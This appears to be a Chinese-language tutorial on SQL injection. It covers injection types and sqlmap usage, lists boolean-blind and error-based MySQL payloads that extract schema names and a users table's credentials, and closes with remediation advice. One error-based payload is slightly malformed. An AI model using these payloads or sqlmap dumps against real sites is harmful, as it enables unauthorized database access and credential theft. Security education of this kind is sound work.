## 1. SQL注入漏洞

Web程序代码中，因为有些操作数据库的代码，直接使用了用户输入的字符，导致查询语句打破了操作语句原有的逻辑，结果黑客能使用漏洞来执行任意数据库语句，如查找数据、下载数据、写入webshell、执行系统命令、绕过登录。



### SQL注入原理

SQL注入漏洞需要满足两个条件：

- 参数用户可控： 从前端传给后端你的参数内容是用户可以控制的
- 参数代入数据库查询：传入的参数会拼接到查询语句，带入到数据库去查询



##### 判断是否存在注入

回显是指页面有数据 信息返回

无回显是指根据输入的语句，页面没有任何变化，或者没有数据库中的内容显示到网页中



### 注入流程



### SQL注入分类

- UNION query SQL injection（可联合查询注入）
- Stacked queries SQL injection（可多语句查询注入） 堆叠查询
- Boolean-based blind SQL injection（布尔型注入）
- Error-based SQL injection（报错型注入）
- TIme-based blind SQL injection（基于时间延迟注入）



### SQL注入常规思路

1. 寻找注入点，可以通过`sqlmap`工具实现
2. 通过注入点，尝试获取数据用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息
3. 猜解关键数据库及其重要字段与内容（常见如存放管理员账户的表明、字段等），还可以获取数据库的root账号密码
4. 可以通过获取用户信息，寻找后台登录
5. 利用后台了解进一步信息



#### 1. 使用sqlmap注入，依照请求类型分类

##### 1. get请求

由于请求内容是直接拼接在url后面，因此在使用sqlmap的时候，可以直接使用进行注入

```shell
sqlmap -u "url" -p 参数名 
```

##### 1. post请求

- ###### 方式1： 

由于请求内容一般存在请求体内，因此可以使用`burpsuite`对请求进行截取，然后通过使用**--dbs,-D,-T,-C获取库名，指定数据库，指定表名，指定列名**

```shell
sqlmap -r "文件路径" -p 参数名 (-- dbs 获取所有数据库 ) (-D 指定库名 -- tables 获取所有表) (-T 表明 --columns获取所有列明) (-C "列名，拼接" --dump破解所有行数据)
```

-  ###### 方式2：

使用自动表单,会自动发起一个请求帮你找到body中需要传递的参数

```shell
sqlmap -u " url" --forms
```

- ###### 方式3

自定指定body中参数内容，需要自己在字符串中拼接

```shell
sqlmap -u "url" --data "id=1&submit=1"
```







### SQL手工注入过程

1. 判断是否存在注入，判断注入类型
2. 使用`order by`猜解SQL语句的字段数
3. 获取当前数据库、表、字段名
4. 查询数据库中的账户信息



#### 联合查询注入

联合查询注入是联合两个表进行注入攻击，使用关键字`union select`对两个表进行联合查询。两个表的字段数要相同。

猜出查询表的字段名，然后使用一些函数，或者函数拼接，拼接到联合查询语句中，达到对数据库的查询。一般的函数有`version()`,`database()`,`user()`,`group_concat()`



###### Information_schema表

这个表有`columns`,`tables`,`SCHEMATA`字段中，能查询到库名、表名，和字段名。



#### 盲注入

查询结果无论对错，都不会将数据库返回信息直接展示到页面上，而是将if-else语句展示到页面上。

盲注入的方式有两种：

- 布尔型盲注入
- 延时注入



##### 布尔型盲注入

对于那些只能进行盲注入的网页，由于输入内容的改变只会造成页面UI的不一样，但是无法直接通过拼接数据库查询语句返回有消息。因此在处理盲注入的时候，通过拼接`select if(1=1,1,0)`这种判断语句，转换成自己想要知道的信息的比较，从真值中获得自己想要的信息。



1. ###### 布尔型盲注入获取数据库敏感信息

基于布尔盲注的原理，可以构造获取数据库信息的时候，根据全字符或部分字符进行判断，从而获取数据的敏感信息。

如：

```	shell
select if(substring(database(),1,1)='d',1,0)

```



2. ###### 黑盒模式下布尔型注入

步骤：

- 首先判断注入
- 获取数据库长度，得到长度后，通过部分截取字符比较，得到每个字符，具体操作使用burpsuite的`Cluster boomb`模式，其实也是可以自己写脚本来进行循环判断字符。
- 同样的思路去查询表
- 最后指定查询表中的数据

一般进行判断比较字符库：

```shell
a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_"
```



1. 获取库名

```sql
1' and if(substring(database(),1,1)='d',1,0)--+
```

2. 获取表名

```sql
1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)--+
```

3. 获取列名

```sql
1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1,1),1,1)='u',1,0)--+
```

4. 获取每一行数据

```sql
# 首先判断查询账号和密码的长度
1'and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)=38,1,0)--+
```

```sql
# 获取账号密码
1'and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)--+
```



### 报错注入

要点：当页面无回显且在输入错误信息的时候，能返回报错信息。一般这些报错信息是函数执行`mysqli_error(),mysqli_connect_error()`将错误信息返回到页面上。



#### 常用报错注入函数

##### 1. floor

```sql
(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

使用了`count(),rand(),floor(),group by`这几个函数。

`rand()`会随机生成范围内的值，这里`rand(0`)会生成0~1的值，`rand(0)*2`就是0~2的值，然后带上`floor()`，就是0或1，但是这个0，1生成的顺序会和rand()函数调用有关系。

特别注意的地方是`group by`这个里，会使用`x`作为主键，**意思是不存在的时候先新建一行，存在的时候就会调用count()的计数加一**。然后由于`floor(rand(0)\*2)`作为主键，**在判断是否存在主键的时候会先计算值一次，然后在使用的时候又会再计算一次，因此会造成判断值和插入值不一样**，出现的问题就是，当前可能表中已经存在主键“XXX1”，此次判断是否需要插入的键为“XXX0”，于是需要插入，但是插入时重新计算了值“XXX1”，就会造成主键重复插入的错误,由于此特性，也需要查询内容数量要至少3条。

- 爆破用户信息

```sql
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破库

```sql
and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破表名

```sql
and (select 1 from (select count(*),concat((select table_name from information_schema)),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破字段名

```sql
and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

- 爆破数据

```sql
and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
```



##### 2. updatexml

```sql
and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

```

函数报错原因:

因为函数插入参数的时候，使用了`~`,`^`的ASCII编码，分别为`0x7e`,`0x5e`，这类特殊字符在使用这些函数的时候都是非法的，因此会产生报错信息。而在报错的是哦户，SQL的解析器会自动解析SQL语句，然后造成SQL语句的执行。



##### 3. extractvalue

```sql
and (extractvalue(1,concat(0x7e,(select user()),0x7e)));	
```

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错。原理和`updatexml`一样。



##### 4. exp 

`exp`是以e为底的指数函数，但是太大会溢出。`exp(709)`会产生溢出，报错。







#### 报错注入的缺陷和解决方法

报错注入的回显内容，一般只有32位长度的字符串，这时候我们可以字符串截断函数截断查询的SQL语句来回显32位后面的内容，常用的字符串截断函数有`left`,`right`,`mid`,`substr`等等。



### 修复建议

 代码层最佳防御 sql 漏洞方案:采用 sql 语句`预编译`和`绑定变量`，是防御 sql 注入的最佳方法。

( 1 ) 所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使 **用参数而不是将用户输入变量嵌入到 SQL 语句中**。当前几乎所有的数据库系统 都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注 入攻击。

( 2 ) 对进入数据库的特殊字符( ' <>&*; 等)进行转义处理，或编码转换。 

( 3 ) 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。

( 4 ) 数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句 无法正确执行。

( 5 ) 网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码 不一致有可能导致一些过滤模型被绕过。

( 6 ) 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其 工作的权限，从而最大限度的减少注入攻击

对数据库的危害。

( 7 ) 避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻 击者利用这些错误信息进行一些判断。	